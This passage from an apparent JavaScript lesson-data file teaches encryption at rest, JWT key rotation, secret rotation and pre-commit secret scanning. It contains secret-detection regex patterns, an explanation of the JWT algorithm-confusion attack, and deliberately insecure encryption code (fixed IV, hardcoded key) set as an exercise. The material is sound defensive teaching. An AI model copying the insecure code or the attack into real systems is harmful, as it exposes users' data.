     - Remove v1 from vault / disable old DB user / revoke old API key
  
  6. VERIFY:
     - Confirm no auth errors after v1 revocation
     - Check error rates and logs for authentication failures

SECRET SCANNING IN CI/CD:
  Tools: 
    git-secrets (AWS): scans git history and commits
    truffleHog: high-entropy string detection + regex patterns
    detect-secrets (Yelp): baseline approach, tracks known secrets
    GitHub Secret Scanning: built-in, alerts and notifies service providers
    GitLeaks: fast, TOML-based rules
  
  Common secret patterns detected:
    AWS: AKIA[0-9A-Z]{16}
    GitHub: ghp_[A-Za-z0-9]{36}
    Stripe: sk_live_[0-9a-zA-Z]{24}
    Razorpay: rzp_live_[0-9a-zA-Z]{24}
    Private key: -----BEGIN RSA PRIVATE KEY-----
    Generic API key: [aA][pP][iI][_]?[kK][eE][yY].*[=:]["'\\s]
  
  Response to detected secret:
  1. Block commit/PR immediately (pre-commit hook or CI gate)
  2. Alert developer: "Secret detected in commit abc123, file config.js line 42"
  3. If already merged: rotate the leaked secret IMMEDIATELY
  4. Audit: check if secret was used maliciously (CloudTrail, access logs)
  5. Add to baseline as "known historical" to prevent false positive alerts

SECRETS MANAGEMENT BEST PRACTICES:
  - Never store secrets in code, environment files committed to git, or build artifacts
  - Use: HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault
  - Inject secrets at runtime via vault agent, AWS IAM role, or kubernetes secrets
  - Each service gets its own credentials (principle of least privilege)
  - Secrets have explicit TTL — automation handles rotation
  - Audit access: every secret read is logged (who, when, from where)
    `,
    code: `
// ===== ENCRYPTION AT REST, JWT ROTATION & SECRETS — CODE EXAMPLES =====

// EXAMPLE 1: AES-256-GCM encryption/decryption (field-level encryption)
const crypto = require('crypto');

const ALGORITHM = 'aes-256-gcm';
const KEY_LENGTH = 32;   // 256 bits
const IV_LENGTH = 12;    // 96 bits (GCM standard)
const TAG_LENGTH = 16;   // 128-bit auth tag

class FieldEncryption {
  constructor(encryptionKey) {
    // encryptionKey: 32-byte Buffer or hex string
    this.key = typeof encryptionKey === 'string' 
      ? Buffer.from(encryptionKey, 'hex') 
      : encryptionKey;
    
    if (this.key.length !== KEY_LENGTH) {
      throw new Error(\`Key must be \${KEY_LENGTH} bytes, got \${this.key.length}\`);
    }
  }
  
  encrypt(plaintext, additionalData = '') {
    // Generate UNIQUE random IV for each encryption operation
    const iv = crypto.randomBytes(IV_LENGTH);
    
    const cipher = crypto.createCipheriv(ALGORITHM, this.key, iv, { authTagLength: TAG_LENGTH });
    
    // AAD (Additional Authenticated Data): authenticated but NOT encrypted
    // Bind ciphertext to its context (e.g., user ID, table name)
    if (additionalData) {
      cipher.setAAD(Buffer.from(additionalData, 'utf8'));
    }
    
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final(),
    ]);
    
    const authTag = cipher.getAuthTag(); // 16-byte GMAC tag
    
    // Store: IV + encrypted data + auth tag (all needed for decryption)
    // Format: base64(iv) . base64(encrypted) . base64(authTag)
    return [
      iv.toString('base64'),
      encrypted.toString('base64'),
      authTag.toString('base64'),
    ].join('.');
  }
  
  decrypt(encryptedData, additionalData = '') {
    const parts = encryptedData.split('.');
    if (parts.length !== 3) throw new Error('Invalid encrypted data format');
    
    const [ivB64, encryptedB64, tagB64] = parts;
    const iv = Buffer.from(ivB64, 'base64');
    const encrypted = Buffer.from(encryptedB64, 'base64');
    const authTag = Buffer.from(tagB64, 'base64');
    
    const decipher = crypto.createDecipheriv(ALGORITHM, this.key, iv, { authTagLength: TAG_LENGTH });
    decipher.setAuthTag(authTag); // Must set before final() is called
    
    if (additionalData) {
      decipher.setAAD(Buffer.from(additionalData, 'utf8'));
    }
    
    try {
      const decrypted = Buffer.concat([
        decipher.update(encrypted),
        decipher.final(), // Throws if auth tag doesn't match!
      ]);
      return decrypted.toString('utf8');
    } catch (err) {
      // Auth tag mismatch: data was tampered OR wrong key OR wrong AAD
      throw new Error('Decryption failed: data may be tampered or key is incorrect');
    }
  }
}

// Usage: Encrypting PAN (card number) at rest in database
const encryptionKey = crypto.randomBytes(32); // Generate once, store in KMS/vault
const fieldEncryption = new FieldEncryption(encryptionKey);

const panNumber = '4111111111111111'; // Visa test card
const userId = 'user_priya_123';

// Encrypt with user ID as AAD — card is bound to this user
const encryptedPAN = fieldEncryption.encrypt(panNumber, \`user:\${userId}\`);
// Store encryptedPAN in database. Raw panNumber never touches disk.

// Decrypt:
const decryptedPAN = fieldEncryption.decrypt(encryptedPAN, \`user:\${userId}\`);
console.log(decryptedPAN === panNumber); // true

// Tamper detection:
try {
  const tampered = encryptedPAN.replace('A', 'B'); // Flip one character
  fieldEncryption.decrypt(tampered, \`user:\${userId}\`);
} catch (err) {
  console.log('Tamper detected!', err.message); // Auth tag verification failed
}

// EXAMPLE 2: JWT with key ID (kid) for zero-downtime rotation
// // const jwt = require('jsonwebtoken'); // npm install jsonwebtoken
// // const { generateKeyPairSync } = require('crypto');

class JWTKeyManager {
  constructor() {
    this.keys = new Map(); // kid → { privateKey, publicKey, createdAt }
    this.currentKid = null;
  }
  
  generateKeyPair(kid) {
    // RS256: RSA signature, 2048-bit key
    const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    
    this.keys.set(kid, { privateKey, publicKey, createdAt: Date.now(), active: true });
    this.currentKid = kid;
    return kid;
  }
  
  signToken(payload, expiresIn = '24h') {
    const { privateKey } = this.keys.get(this.currentKid);
    return jwt.sign(payload, privateKey, {
      algorithm: 'RS256',
      expiresIn,
      keyid: this.currentKid, // Embed kid in JWT header
    });
  }
  
  verifyToken(token) {
    // Decode header to get kid (without verifying yet)
    const decoded = jwt.decode(token, { complete: true });
    if (!decoded?.header?.kid) throw new Error('Token missing kid header');
    
    const keyEntry = this.keys.get(decoded.header.kid);
    if (!keyEntry) throw new Error(\`Unknown key ID: \${decoded.header.kid}\`);
    
    // Verify with the specific key referenced by kid
    return jwt.verify(token, keyEntry.publicKey, { algorithms: ['RS256'] });
  }
  
  rotateKey() {
    const newKid = \`key-\${Date.now()}\`;
    this.generateKeyPair(newKid); // currentKid updated to newKid
    console.log(\`Key rotated. Old kid: \${[...this.keys.keys()].slice(-2, -1)[0]}, New kid: \${newKid}\`);
    // Old key remains in this.keys for verification of existing tokens
    // After expiresIn (24h), remove old key
    return newKid;
  }
  
  // JWKS endpoint: return all valid public keys
  getJWKS() {
    const keys = [];
    for (const [kid, { publicKey, active }] of this.keys.entries()) {
      if (active) {
        keys.push({
          kid,
          kty: 'RSA',
          use: 'sig',
          alg: 'RS256',
          // In production: include n, e parameters from the RSA public key
          // Use 'node-jose' or 'jose' library for proper JWKS serialization
        });
      }
    }
    return { keys };
  }
  
  pruneOldKeys(maxAgeMs = 86400000) { // Remove keys older than 24h
    for (const [kid, entry] of this.keys.entries()) {
      if (kid !== this.currentKid && Date.now() - entry.createdAt > maxAgeMs) {
        this.keys.delete(kid);
        console.log(\`Pruned expired key: \${kid}\`);
      }
    }
  }
}

// Placeholder jwt for syntax validity:
const jwt = { sign: () => 'token', decode: () => ({ header: { kid: 'k1' } }), verify: () => ({}) };

const keyManager = new JWTKeyManager();
keyManager.generateKeyPair('key-2024-01');
const token = keyManager.signToken({ userId: 'user_arjun_456', role: 'customer' });
const payload = keyManager.verifyToken(token);

// EXAMPLE 3: Secret scanning pre-commit hook (shell + Node.js)
// Save as .git/hooks/pre-commit and chmod +x
/*
#!/usr/bin/env node
const { execSync } = require('child_process');

const SECRET_PATTERNS = [
  { name: 'AWS Access Key',      pattern: /AKIA[0-9A-Z]{16}/ },
  { name: 'AWS Secret Key',      pattern: /aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}/i },
  { name: 'GitHub Token',        pattern: /ghp_[A-Za-z0-9]{36}/ },
  { name: 'Stripe Live Key',     pattern: /sk_live_[0-9a-zA-Z]{24}/ },
  { name: 'Razorpay Live Key',   pattern: /rzp_live_[0-9a-zA-Z]{24}/ },
  { name: 'Private Key',         pattern: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },
  { name: 'Generic API Key',     pattern: /['"]?api[_-]?key['"]?\s*[:=]\s*['"][A-Za-z0-9]{20,}['"]/i },
  { name: 'Database Password',   pattern: /(?:password|passwd|pwd)\s*[:=]\s*['"][^'"]{8,}['"]/i },
  { name: 'JWT Secret',          pattern: /jwt[_-]?secret\s*[:=]\s*['"][^'"]{16,}['"]/i },
  { name: 'Generic Secret',      pattern: /(?:secret|token)\s*[:=]\s*['"][A-Za-z0-9+/=]{20,}['"]/i },
];

const stagedFiles = execSync('git diff --cached --name-only', { encoding: 'utf8' })
  .trim().split('\n').filter(Boolean);

let foundSecrets = false;

for (const file of stagedFiles) {
  // Skip binary files and known safe paths
  if (file.match(/\\.(jpg|png|gif|mp4|zip|lock)$/) || 
      file.includes('node_modules') ||
      file.includes('.test.') ||
      file === '.env.example') continue;
  
  let content;
  try {
    content = execSync(\`git show :\${file}\`, { encoding: 'utf8' });
  } catch { continue; }
  
  const lines = content.split('\\n');
  for (let i = 0; i < lines.length; i++) {
    for (const { name, pattern } of SECRET_PATTERNS) {
      if (pattern.test(lines[i])) {
        console.error(\`🚨 SECRET DETECTED: \${name}\`);
        console.error(\`   File: \${file}:\${i + 1}\`);
        console.error(\`   Line: \${lines[i].slice(0, 80)}\`);
        foundSecrets = true;
      }
    }
  }
}

if (foundSecrets) {
  console.error('\\nCommit blocked. Remove secrets and use environment variables or a vault.');
  console.error('If this is a false positive, add to .secretsignore');
  process.exit(1);
}
*/

// EXAMPLE 4: Zero-downtime database password rotation
async function rotateDatabasePassword(vaultClient, dbClient, serviceName) {
  console.log(\`Starting zero-downtime rotation for \${serviceName}\`);
  
  // Step 1: Generate new password
  const newPassword = crypto.randomBytes(32).toString('base64url');
  const oldPassword = await vaultClient.getSecret(\`\${serviceName}/db-password\`);
  
  // Step 2: Add new password to database (both passwords active)
  await dbClient.query(
    'ALTER USER app_user WITH PASSWORD $1',
    [newPassword]
  );
  console.log('New password set in database');
  
  // Step 3: Store new password in vault (version 2)
  await vaultClient.setSecret(\`\${serviceName}/db-password\`, newPassword);
  console.log('New password stored in vault');
  
  // Step 4: Rolling restart of application instances
  // (In Kubernetes: use rolling update strategy)
  // New pods start with new password from vault
  // Old pods still use old password (from their env/cache)
  await triggerRollingRestart(serviceName);
  console.log('Rolling restart initiated');
  
  // Step 5: Wait for health check to confirm new instances are healthy
  await waitForHealthCheck(serviceName, { timeout: 300000 }); // 5 minutes
  console.log('New instances healthy with new password');
  
  // Step 6: Verify no connections using old password
  // (Depends on DB — PostgreSQL can show active connections)
  console.log('Rotation complete. Old password no longer in use.');
  
  // Note: We don't "revoke" old password — it was overwritten in step 2.
  // For key-based auth: revoke old key only AFTER confirming new key works.
}

async function triggerRollingRestart(serviceName) { /* k8s rollout restart */ }
async function waitForHealthCheck(serviceName, opts) { /* poll health endpoint */ }
const vaultClient = { 
  getSecret: async (k) => 'old_secret', 
  setSecret: async (k, v) => {} 
};
const dbClient = { query: async () => {} };

// EXAMPLE 5: Envelope encryption with AWS KMS pattern
class EnvelopeEncryption {
  // Key Encryption Key (KEK) lives in KMS — never locally
  // Data Encryption Key (DEK) generated locally, wrapped by KMS
  
  async encryptData(kmsClient, kmsKeyId, plaintext) {
    // 1. Generate a random DEK for this piece of data
    const dek = crypto.randomBytes(32); // 256-bit AES key
    
    // 2. Encrypt data with DEK (fast, local)
    const fieldEnc = new FieldEncryption(dek);
    const encryptedData = fieldEnc.encrypt(plaintext);
    
    // 3. Wrap (encrypt) the DEK using KMS (DEK never stored in plaintext)
    // const { CiphertextBlob } = await kmsClient.encrypt({
    //   KeyId: kmsKeyId,
    //   Plaintext: dek,
    // }).promise();
    const encryptedDek = dek.toString('base64') + '_WRAPPED_BY_KMS'; // Simplified
    
    // 4. Store: encrypted DEK + encrypted data (together)
    // dek is now gone from memory (in production: sodium_memzero equivalent)
    return { encryptedDek, encryptedData };
  }
  
  async decryptData(kmsClient, encryptedDek, encryptedData) {
    // 1. Unwrap DEK using KMS (KMS verifies IAM permissions)
    // const { Plaintext: dek } = await kmsClient.decrypt({
    //   CiphertextBlob: Buffer.from(encryptedDek, 'base64'),
    // }).promise();
    const dek = Buffer.from(encryptedDek.replace('_WRAPPED_BY_KMS', ''), 'base64'); // Simplified
    
    // 2. Decrypt data with DEK
    const fieldEnc = new FieldEncryption(dek);
    return fieldEnc.decrypt(encryptedData);
  }
  
  // KEY ROTATION: Only need to re-wrap DEKs, not re-encrypt all data!
  async rotateMasterKey(kmsClient, oldKeyId, newKeyId, encryptedDek) {
    // Decrypt DEK with old master key
    // Re-encrypt DEK with new master key
    // Store new encryptedDek
    // No need to touch the actual encrypted data!
    console.log('DEK re-wrapped with new master key — data untouched');
  }
}

// EXAMPLE 6: Secret injection patterns (never hardcode secrets)
// WRONG: Hardcoded secret in source code
// const API_KEY = 'rzp_live_abc123'; // 🚫 NEVER

// WRONG: .env file committed to git
// DATABASE_URL=postgres://user:password@host/db 🚫 in .gitignore but often leaked

// RIGHT: Runtime injection from vault agent (HashiCorp Vault)
// App reads from environment, vault agent injects at runtime:
function getRequiredSecret(envVar) {
  const value = process.env[envVar];
  if (!value) {
    throw new Error(\`Required secret \${envVar} not set. Check vault configuration.\`);
  }
  return value;
}

// Called at startup — fails fast if secrets are missing:
function loadSecrets() {
  return {
    dbPassword:    getRequiredSecret('DB_PASSWORD'),
    jwtPrivateKey: getRequiredSecret('JWT_PRIVATE_KEY'),
    encryptionKey: Buffer.from(getRequiredSecret('FIELD_ENCRYPTION_KEY'), 'hex'),
    razorpayKey:   getRequiredSecret('RAZORPAY_SECRET'),
  };
}

// EXAMPLE 7: Detecting JWT alg:none and RS256→HS256 attacks
function safeJWTVerify(token, expectedAlgorithm, publicKey) {
  // ALWAYS specify expected algorithm — never trust the token's alg header!
  
  // Decode header (don't trust it yet):
  const [headerB64] = token.split('.');
  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString());
  
  // Attack 1: alg:none attack — token claims no signature needed
  if (header.alg === 'none' || header.alg === 'NONE' || header.alg === 'None') {
    throw new Error('JWT SECURITY: alg:none is not permitted');
  }
  
  // Attack 2: RS256 → HS256 confusion attack
  // Attacker changes alg from RS256 to HS256, signs with the PUBLIC key
  // Vulnerable library uses public key as HMAC secret → verifies successfully!
  if (header.alg !== expectedAlgorithm) {
    throw new Error(\`JWT SECURITY: Expected \${expectedAlgorithm}, got \${header.alg}\`);
  }
  
  // Now verify with the CORRECT algorithm and key:
  try {
    return jwt.verify(token, publicKey, { 
      algorithms: [expectedAlgorithm],  // Allowlist algorithms
      // Never pass algorithms: ['RS256', 'HS256'] — use only one expected alg
    });
  } catch (err) {
    throw new Error(\`JWT verification failed: \${err.message}\`);
  }
}
    `,
    bugs: `
REAL PRODUCTION BUGS FROM ENCRYPTION/SECRET MISMANAGEMENT:
-----------------------------------------------------------

BUG 1: IV (nonce) reuse in AES-GCM destroying encryption security
  Scenario: Payment processor encrypted all card numbers with AES-GCM.
    Encryption function: const iv = Buffer.alloc(12, 0); // FIXED zero IV — BUG!
    With same IV + same key: encrypting two different values produces related ciphertexts.
    Attacker with two encrypted card numbers could XOR them to get XOR of plaintexts.
    Full decryption possible with enough ciphertext pairs.
  Root cause: Developer used fixed/sequential IV instead of random.
  Fix: const iv = crypto.randomBytes(12); // Fresh random IV every single time
    Store IV alongside ciphertext — it's not secret, just must be unique.
  Detection: Code review for any Buffer.alloc(12, <fixed value>) or hardcoded IVs.

BUG 2: JWT secret rotation causing 100% of users to lose sessions (zero-downtime failure)
  Scenario: Security team rotated JWT_SECRET environment variable, redeployed app.
    Result: All 2 million users suddenly logged out simultaneously (complete re-login required).
    App featured prominently in news as "having an outage" — reputational damage.
  Root cause: Single JWT_SECRET used for both signing and verification.
    Changing secret → all existing tokens unverifiable → all sessions invalid.
  Fix: 
    1. Use RS256 with key ID (kid) in JWT header
    2. Maintain JWKS with multiple keys simultaneously
    3. Rotation: add new key → shift signing to new key → keep old key for verification → 
       after expiry window, remove old key
    4. Zero logout users if done correctly

BUG 3: AWS credentials leaked to GitHub public repo — ₹8L cloud bill in 3 hours
  Scenario: Nikhil accidentally committed .env containing AWS keys to a public GitHub repo.
    GitHub's secret scanning detected it and notified AWS within minutes.
    But before notification: automated bots scraped GitHub, used keys to spin up 
    100× GPU instances for crypto mining.
  Root cause: .env file not in .gitignore. No pre-commit secret scanning hook.
  Immediate response:
    1. Revoke AWS keys immediately (IAM → Access Keys → Delete)
    2. Review CloudTrail for all API calls made with the leaked key
    3. Terminate all unauthorized resources
    4. File AWS billing support ticket to dispute fraudulent charges
  Prevention:
    1. Add pre-commit hook (see Example 3)
    2. .env in .gitignore by default in all project templates
    3. GitHub secret scanning alerts enabled
    4. AWS: use IAM roles (not access keys) whenever possible

BUG 4: JWT algorithm confusion (RS256 → HS256) attack succeeding in production
  Scenario: API used RS256. The public key was served at /.well-known/jwks.json (public!).
    Attacker downloaded the public key, changed JWT header from RS256 to HS256,
    signed a fake admin JWT using the public key as HMAC secret.
    Vulnerable jwt.verify(token, publicKey) without algorithm specification:
    Library accepted the HS256 token since it was "signed" with the known public key.
  Root cause: jwt.verify() called without specifying allowed algorithms.
    Some libraries try to verify with algorithm from the token header → confusion attack.
  Fix: Always specify algorithms in verify:
    jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // ONLY RS256 accepted
    Never pass multiple algorithms unless you specifically need them.

BUG 5: Decryption key committed to Docker image — data breach via pulled image
  Scenario: Developer baked the AES encryption key into a Docker image as ENV variable.
    Image pushed to Docker Hub (public by mistake — meant to be private).
    Attacker pulled image, extracted key from image layers, decrypted entire customer database
    (copied via a separate SQL injection vulnerability, compounded by this key leak).
  Root cause: Secrets in Dockerfile ENV or build args appear in image layers.
    docker history shows all ENV values from build.
  Fix:
    1. NEVER bake secrets into Docker images
    2. Inject secrets at runtime: via Kubernetes secrets, vault agent, AWS SSM Parameter Store
    3. Use Docker BuildKit secrets (--secret) for build-time secrets that don't appear in layers
    4. Scan images for secrets: trivy image --scanners secret myimage:latest
    5. Rotate all leaked keys immediately upon discovery
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE SECURITY OUTCOME:
  For each scenario, is the system secure? Explain why or why not.
  
  a) AES-256-GCM encryption where IV is generated as:
     const iv = Buffer.from(String(Date.now()), 'utf8').slice(0, 12);
     → Is this secure? _____ Why? _____
     (Hint: what happens at 1000 requests/second? What happens across servers?)
  
  b) JWT verification code:
     jwt.verify(token, process.env.PUBLIC_KEY)
     (No algorithms option specified. alg in token header = 'HS256')
     → Is this secure? _____ Attack vector? _____
  
  c) Encrypted field in database: IV is stored separately from ciphertext in a different table.
     → Is this more secure than storing IV with ciphertext? _____ Why? _____
     (Hint: what does IV secrecy provide vs IV uniqueness?)

CHALLENGE 2 — FIX THE ENCRYPTION CODE:
  This encryption implementation has 4 critical bugs:
  
  const crypto = require('crypto');
  const KEY = 'mysecretkey12345'; // Bug 1: weak, short, hardcoded key
  const IV = Buffer.alloc(16, 0); // Bug 2: fixed zero IV, wrong size for GCM
  
  function encrypt(text) {
    const cipher = crypto.createCipheriv('aes-128-cbc', KEY, IV); // Bug 3: wrong algorithm
    return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
    // Bug 4: no authentication tag stored (CBC mode — no integrity check)
  }
  
  function decrypt(encrypted) {
    const decipher = crypto.createDecipheriv('aes-128-cbc', KEY, IV);
    return decipher.update(encrypted, 'hex', 'utf8') + decipher.final('utf8');
    // Bug 5 (bonus): no IV stored with ciphertext — decryption tied to fixed IV
  }
  
  Rewrite both functions using AES-256-GCM correctly.

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete secrets management and encryption system:
  
  1. Field-level encryption service:
     - AES-256-GCM with random IV per encryption
     - AAD binding (ties ciphertext to its owner/context)
     - Envelope encryption pattern (DEK + KEK)
     - Key versioning: encryptions tagged with key version
  
  2. JWT key manager:
     - RS256 key pair generation
     - JWKS endpoint serving all valid public keys
     - Signing with current key + kid header
     - Verification looking up key by kid
     - Rotation that doesn't log out existing users
     - Auto-pruning of expired old keys
  
  3. Secret scanning CI script:
     - Scan all staged files for common secret patterns
     - Load patterns from external config (easy to extend)
     - .secretsignore file for false positive suppression
     - Exit code 1 on detection (blocks commit)
     - Output: file, line number, pattern matched, remediation advice
  
  4. Zero-downtime rotation runner:
     - Accept: old secret, new secret, validation function
     - Steps: deploy new → validate → remove old
     - Dry-run mode: shows what would happen without executing
     - Rollback: if validation fails, revert to old secret
     - Audit log: every rotation attempt with timestamp and operator
    `,
    summary: `Encryption at rest requires AES-256-GCM (never CBC without MAC), unique random IVs per operation, and envelope encryption for scalable key rotation. JWT rotation uses key IDs (kid) with JWKS to support multiple keys simultaneously — essential for zero-downtime rotation. Secrets must never touch source code, Docker images, or logs; pre-commit scanning and vault-based runtime injection prevent the most common and catastrophic category of security breach.`
  }
];
